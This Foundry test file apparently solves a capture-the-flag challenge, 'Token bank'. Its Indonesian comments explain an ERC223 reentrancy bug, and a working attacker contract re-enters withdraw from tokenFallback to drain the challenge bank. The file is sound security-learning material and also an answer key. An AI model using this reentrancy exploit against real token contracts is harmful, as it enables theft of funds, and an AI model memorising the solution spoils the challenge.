// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// #14 Token bank — kontrak 0.4.21 asli. REENTRANCY ERC223:
// `withdraw(amount)` memanggil `token.transfer(msg.sender, amount)`
// SEBELUM `balanceOf[msg.sender] -= amount`. Token ERC223 memanggil
// `tokenFallback` pada penerima bila penerima adalah kontrak. Jadi
// kontrak penyerang bisa masuk kembali ke `withdraw` dari dalam
// `tokenFallback`, selagi balanceOf-nya belum dikurangi.
// Serangan (player = penyerang, saldo bank 500.000e18):
//   withdraw(500.000e18) -> transfer 500.000e18 -> tokenFallback ->
//   withdraw lagi(500.000e18) -> transfer 500.000e18 lagi (saldo bank
//   token 0) -> balanceOf penyerang 500.000e18 -> 0. Kembali ke
//   withdraw luar: balanceOf 0 - 500.000e18 UNDERFLOW (0.4.x, diam-diam)
//   -> tidak revert. Saldo token bank = 0 -> isComplete.
// (Di Solidity 0.8.x serangan ini GAGAL: decrement luar akan revert
// karena checked arithmetic — karena itu dipakai kontrak 0.4.21 asli.)
contract TokenBankAttacker {
    address public target;
    bool private entered;

    function setTarget(address _t) external {
        target = _t;
    }

    function attack(uint256 amount) external {
        (bool ok, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(ok);
    }

    function tokenFallback(address, uint256, bytes calldata) external {
        if (!entered) {
            entered = true;
            (bool ok, ) = target.call(
                abi.encodeWithSignature("withdraw(uint256)", 500000 * 10 ** 18)
            );
            require(ok);
        }
    }

    receive() external payable {}
}

contract TokenBankSolve is Test {
    address challenge;
    TokenBankAttacker attacker;

    function setUp() public {
        attacker = new TokenBankAttacker();
        challenge = deployCode(
            "TokenBankChallenge.sol:TokenBankChallenge",
            abi.encode(address(attacker))
        );
        attacker.setTarget(challenge);
    }

    function testInit() public view {
        (bool ok, bytes memory ret) = challenge.staticcall(abi.encodeWithSignature("isComplete()"));
        assertTrue(ok);
        assertFalse(abi.decode(ret, (bool)));
    }

    function testSolve() public {
        attacker.attack(500000 * 10 ** 18);
        (bool ok, bytes memory ret) = challenge.staticcall(abi.encodeWithSignature("isComplete()"));
        assertTrue(ok);
        assertTrue(abi.decode(ret, (bool)));
    }
}
